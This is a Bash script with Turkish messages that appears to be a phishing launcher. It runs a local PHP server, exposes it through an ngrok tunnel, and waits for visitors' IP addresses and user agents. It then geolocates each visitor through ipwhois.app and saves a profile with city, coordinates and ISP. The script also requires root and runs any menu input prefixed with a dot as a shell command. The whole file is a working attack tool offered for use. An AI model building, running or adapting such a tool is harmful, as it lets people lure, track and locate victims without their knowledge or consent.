#!/usr/bin/env bash
#ADD VARİABLES


renk["red",1]="\e[1;31m"
renk["green",2]="\e[1;32m"
renk["blue",3]="\e[1;34m"
renk["yellow",4]="\e[1;33m"
renk["cyan",5]="\e[1;96m"
renk["white",6]="\e[1;97m"
renk["normal",7]="\e[1;0m"
#ADD SPECİFİC VARİABLES



end_user_agreement() { 
    if [ ! -e /usr/bin/ok.txt ]; then 
    echo -e """
    ${renk[1]}UYARI:${renk[6]}:BU ARACI KULLANARAK ${renk[5]}SORUMLULUĞU KENDİN/KENDİNİNİZ ALMAKTASINIZ ${renk[1]}.BU ARAÇ ${renk[4]} ${renk[5]} YÜZÜNDEN ${renk[7]} BAŞIMA GELECEKLERDEN SORUMLU DEĞİLİMDİR BİLGİNİZE ${renk[1]} BÜTÜN SORUMLULUK SİZE AİTTİR BİLGİNİZE[!]"""
    while [ true ]; do 
    echo -e "$(whoami)@$(hostname)-> KABUL EDİYOR  MUSUNUZ ${renk[1]}[E/${renk[4]}h${renk[7]}]${renk[6]} \c"
    read anwser
    if [[ $anwser == "E" || $anwser == "e" ]]; then 
        echo "OK " > /usr/bin/ok.txt 
        break
    elif [[ $anwser == "H" || $anwser == "h" ]]; then 
        exit 
    else
        echo -e "GEÇERSİZ $anwser Sadecee {-[E|e|Hh-|h]-} "
    fi 
    done 
fi  
 }

local_infos() { 
    lan_ip=$(hostname -I) > /dev/null 2>&1
    #wan_ip=$(curl icanhazip.com ) > /dev/null 2>&1 &
    user=$(whoami) > /dev/null 2>&1
    hostname=$(hostname) > /dev/null 2>&1 
    uptime=$(uptime| cut -d "," -f1 ) > /dev/null 2>&1 
    time=$(date) > /dev/null 2>&1
}
banner() { 
    while IFS= read -r l  
    do
        echo -e "${renk[$RANDOM % 6 ]} $l"
        sleep 0.067890876578987392147592
    done < scs.txt
    for line in $(cat eof.txt); do
        echo -ne "${renk[$RANDOM % 6]}$line"
        sleep 0.02341234
    done
    echo -e "\n "


}

check_dependendicies() {
    ping -c 1 www.google.com > /dev/null 2>&1 
        if [[ "$?" -eq "0" ]]; then 
            echo -e "${renk[$RANDOM%6]}[İNTERNET].......................................   ${renk[2]}[${renk[3]}OK${renk[2]}]${renk[7]} "
        else  
            echo -e "[İNTERNET].......................................   ${renk[2]}[${renk[3]}FAİL${renk[2]}]${renk[7]} "
            sleep 1
            echo -e "${renk[1]}HATA:BU ARAÇ İNTERNET BAĞLANTISI GEREKTİRİR[!]${renk[7]}"
            exit
        fi 
    local tools=( "php" "curl" "kill" "cut" "awk" "grep" "sed" "firefox" "date" "uptime" "hostname" "ps" "toilet" "ping" "wget" )
    COUNTER=1
    for tool in ${tools[@]}; do
        which $tool > /dev/null 2>&1
        if [[ "$?" -eq "0" ]]; then 
            echo -e "${renk[$RANDOM%6]}[$tool].......................................   ${renk[2]}[${renk[3]}OK${renk[2]}]${renk[7]} "
        else  
            echo -e "[$tool].......................................   ${renk[2]}[${renk[3]}FAİL${renk[2]}]${renk[7]} "
            echo -e "$(whoami)@$(hostname):[${renk[1]}$tool${renk[7]}]~>Uyarı:$tool Adlı araç internetinizden kullanılarak indirilecektir bilginize [E/h] \c" 
            COUNTER=0
            read ans
            if [[ $ans == "e" || $ans == "E" || $ans == "y" || $ans == "Y" ]]; then 
                apt install $tool -y 
            fi 
            continue
            check_dependendicies
        
        fi
    sleep 0.1231341
    alias rainbow_cerceve="toilet -f term -F border --gay" # toilet -f term -F border --gay rename as rainbow
    done
    if [[ $COUNTER -eq "1" ]]; then 
        echo -e "Bütün gereklilikler ${renk[1]}TAMAM${renk[7]} araç ${renk[5]}verimli${renk[7]} bi şekilde çalışabilir"
        echo -e "DEVAM ETMEK İÇİN [ENTER]'A BASIN "
        read 
    else 
        echo -e "${renk[1]}BAZI ARAÇLAR YÜKLÜ DEĞİL !!!"
        sleep 1
        echo -e "ARAÇTAN ÇIKILIYOR...."
        exit
    fi
}
start_up() { 
    killall -2 ngrok > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1

}
catch_creds() { 
    ip=$(grep -a 'IP:' ip.txt | cut -d ":" -f2 | tr -d '\r')
    curl http://ipwhois.app/json/$ip -o creds.json > /dev/null 2>&1 &
    echo "VERİLER GELİYOR LÜTFEN BEKLE " | toilet -f term -F border --gay 
    sleep 6 
    if [[ -e creds.json ]]; then 
        ulke=$(cat creds.json |cut -d "," -f6 |cut -d ":" -f2 |sed "s|\"||g")
        ip_tipi=$(cat creds.json |cut -d "," -f3 |cut -d ":" -f2 |sed "s|\"||g")
        bolge_kodu=$(cat creds.json |cut -d "," -f5 |cut -d ":" -f2 |sed "s|\"||g")
        ulke_kod=$(cat creds.json |cut -d "," -f7 |cut -d ":" -f2 |sed "s|\"||g")
        baskent=$(cat creds.json |cut -d "," -f9 |cut -d ":" -f2 |sed "s|\"||g")
        tel_kodu=$(cat creds.json |cut -d "," -f10 |cut -d ":" -f2 |sed "s|\"||g")
        sehir=$(cat creds.json |cut -d "," -f19 |cut -d ":" -f2 |sed "s|\"||g")
        bolge=$(cat creds.json |cut -d "," -f20 |cut -d ":" -f2 |sed "s|\"||g")
        enlem=$(cat creds.json |cut -d "," -f21 |cut -d ":" -f2 |sed "s|\"||g")
        boylam=$(cat creds.json |cut -d "," -f22 |cut -d ":" -f2 |sed "s|\"||g")
        isp=$(cat creds.json |cut -d "," -f24 |cut -d ":" -f2 |sed "s|\"||g")
        zamanzone=$(cat creds.json |cut -d "," -f26 |cut -d ":" -f2 |sed "s|\"||g")
        zamand_diliimi=$(cat creds.json |cut -d "," -f27 |cut -d ":" -f2 |sed "s|\"||g")
        para_birimi=$(cat creds.json |cut -d "," -f31 |cut -d ":" -f2 |sed "s|\"||g")
        para_kisaltma=$(cat creds.json |cut -d "," -f32 |cut -d ":" -f2 |sed "s|\"||g")
        para_sembol=$(cat creds.json |cut -d "," -f33 |cut -d ":" -f2 |sed "s|\"||g")
        dolar_kuru=$(cat creds.json |cut -d "," -f34 |cut -d ":" -f2 |sed "s|\"||g")
        agent=$(cat agent.txt )
        echo -e """
        USER-AGENT: $agent
        ÜLKE: $ulke
        İP: $ip_tipi
        BÖLGE KODU: $bolge_kodu 
        ULKE KODU: $ulke_kodu
        BAŞKENTİ: $baskent 
        ÜLKE TELEFON KODU: $tel_kodu
        ŞEHİR: $sehir 
        BÖLGE: $bolge 
        ENLEM: $enlem
        BOYLAM: $boylam
        ISP   : $isp
        ZAMAN KUŞAĞI: $zamanzone 
        ZAMAN DİLİMİ: $zamand_diliimi
        PARA BİRİMİ : $para_birimi($para_kisaltma)
        PARA SEMBOLU: $para_sembol
        ÜLKEDEKİ DOLAR KURU: $dolar_kuru """ > $ip.txt 
        cp $ip.txt saved/
        while IFS= read -r LINE 
        do 
            echo $LINE | toilet -f term -F border --gay 
            sleep 0.28394714156
        done < $ip.txt 
        rm $ip.txt
        rm creds.json
        rm agent.txt  
        rm ip.txt 
        echo -e "${renk[4]}[ ${renk[5]}+ ${renk[4]}] ${renk[4]}İP SAVED TO ${renk[1]}$(pwd)/saved/$ip.txt ${renk[4]}[ ${renk[5]}+ ${renk[4]}]"
    else 
        echo -e "${renk[1]}VERİLER GETİRELEMEDİ${renk[7]}"
        sleep 2
        echo -e "${renk[4]}İNTERNET BAĞLANTINIZ KONTROL EDİLİYOR..${renk[7]}"
        check_internet
        rm ip.txt 
        rm agent.txt 
    fi 
}
handle_creds() { 

    if [[ -e $(pwd)/ip.txt ]]; then 
        echo -e "OK"
        catch_creds
    else 
        continue
    fi
}


check_internet() { 
    ping -c 1 www.google.com > /dev/null 2>&1 
        if [[ "$?" -eq "0" ]]; then 
            echo -e "${renk[$RANDOM%6]}[İNTERNET].......................................   ${renk[2]}[${renk[3]}OK${renk[2]}]${renk[7]} "
        else  
            echo -e "[İNTERNET].......................................   ${renk[2]}[${renk[3]}FAİL${renk[2]}]${renk[7]} "
            sleep 1
           echo -e "${renk[1]}HATA:BU ARAÇ İNTERNET BAĞLANTISI GEREKTİRİR[!]${renk[7]}"
            exit
        fi 
}
phisher() { 
    echo -e "${renk[1]}PHP SERVERİ BAŞLATILIYOR${renk[7]} "
    cd sites
    php -S 127.0.0.1:4000 > /dev/null 2>&1 &
    if [[ "$?" -eq "0" ]]; then 
        echo -e "${renk[2]}PHP:OK${renk[7]}"
    else 
        echo -e "${renk[1]}PHP:FAİL${renk[7]}"
    fi
    sleep 1
    echo -e "${renk[2]}STARTİNG NGROK.....${renk[7]}"
    ngrok http 4000 > /dev/null 2>&1 &
    sleep 13 
    link=`curl -s -N http://127.0.0.1:4040/api/tunnels |grep -o "https://[0-9a-z]*\.ngrok.io"`
    sleep 13
    text="BAĞLANTI İÇİN BEKLENİYOR"
    echo -e "LİNK: $link" | toilet -f term -F border --gay 
    echo -e "${renk[1]}BAĞLANTI İÇİN BEKLENİYOR\n(("+"*${#text}))"nanano
    while [ true ]; do 
    if [[ -e $(pwd)/ip.txt ]]; then 
        catch_creds
    else
     continue
    fi 
    done
}

trap ctrl_c INT 
ctrl_c() { 
    clear 
    echo -e "${renk[1]}CTRL-C ALGILANDI ÇIKMAK İSTEDİĞİNİZE EMİN MİSİNİZ ?[E/h] \c${renk[7]}" 
    read an 
    if [[ $an == "E" || $an == "e" ]]; then 
        exit 
    else 
        main
    fi
}
trap ctrl_z INT
ctrl_z() { 
    clear 
    echo -e "${renk[1]}CTRL-Z ALGILANDI ÇIKMAK İSTEDİĞİNİZE EMİN MİSİNİZ ?[E/h] \c${renk[7]}" 
    read an 
    if [[ $an == "E" || $ans == "e" ]]; then 
        exit 
    else 
        banner 
        check_dependendicies
        menu
    fi
}
saved_menu() {
    cd sites/saved 
    local COUNTER=1
    echo -e "MENÜYE GERİ DÖNMEK İÇİN 2 YAZIP ENTER'A BASIN"
    echo -e "${renk[4]}$(whoami)${renk[6]}@$(hostname)${renk[5]}}[${renk[3]}${renk[2]}SAVED${renk[6]}:~>192.168.1.1"
    sleep 4 
    echo -e "LİSTELİYORUM......."
    for g in $(ls); do 
        d=$($g |cut -d "." -f1 )
        echo "$d" | toilet -f term -F border --gay 
        sleep 0.1251363273215414
    done 
    while [[ true ]]; do 
        echo -e "${renk[4]}$(whoami)${renk[6]}@$(hostname)${renk[5]}}[${renk[3]}${renk[2]}SAVED${renk[6]}:~> \c"
        read saved 
        if [[ -e $(pwd)/$saved.txt ]]; then
        echo -e "BEKLEYİNİZZ..."
            while IFS= read -r L 
            do
                echo "$L" | toilet -f term -F border --gay 
                sleep 0.232465141
            done < $saved.txt 
        elif [[ $saved == 02 || $saved == 2 ]]; then 
            cd ../../
            menu
        else 
        echo -e "$saved ADLI BULUNAMADI"
        fi 
    done 

}
menu() {
    local IFS="-"
    local COUNTER=1
    choices=( "PHİSHER" "SAVED" "ÇIKIŞ" )
    for f in ${choices[@]}; do 
        sleep 00.12133
        echo -e "[00$COUNTER] $f [00$COUNTER] " | toilet -f term -F border --gay
        ((COUNTER++))
    done
    while [[ true ]]; do
    echo -e "${renk[1]}$(whoami)${renk[6]}@${renk[1]}$(hostname):~>${renk[2]} \c"
    read choice 

    if [[ $choice == 1 || $choice == 01 ]]; then 
        phisher
    elif  [[ $choice == 2 || $choice == 02 ]]; then
        saved_menu
    elif  [[ $choice == 3 || $choice == 03 ]]; then
        exit 
    elif [[ ${choice:0:1} == "." ]]; then
        if [[ "$?" -eq "0" ]]; then
            echo $(${choice:1}) & 
            wait
            echo -e "${renk[2]}COMMAND EXECUTED SUCCESFULLY"
        else 
            echo -e "${renk[1]}ERROR WHİLE COMMAND EXECUTİNG${renk[7]}"
        fi
    elif [[ $choice == 4 || $choice == 04 ]]; then
        exit
    else 
        echo -e "${renk[1]}Hata geçersiz $choice ${renk[7]}"
    fi 
done
}

main() { 
if [[ -d sites/saved ]]; then 
    echo ""
else 
    mkdir sites/saved
fi 
end_user_agreement
banner
echo -e "\n\n\n"
check_dependendicies
#start_up
check_internet
trap ctrl_c INT 

menu
}

if [[ $EUID == 0 ]]; then 
    which ngrok > /dev/null 2>&1 
    if [[ "$?" -eq "0" ]]; then 
        echo ""
    else 
        unzip ngrok.zip > /dev/null 2>&1
        sleep 3
        cp ngrok /usr/bin 
    fi 
    main
else 
    echo -e "${renk[1]}HATA BU ARAÇ ROOT YETKİSİ GEREKTİRİR LÜTFEN ROOT YETKİLERİ İLE ÇALIŞTIRIN[${renk[4]}!${renk[1]}${renk[7]}]"
fi

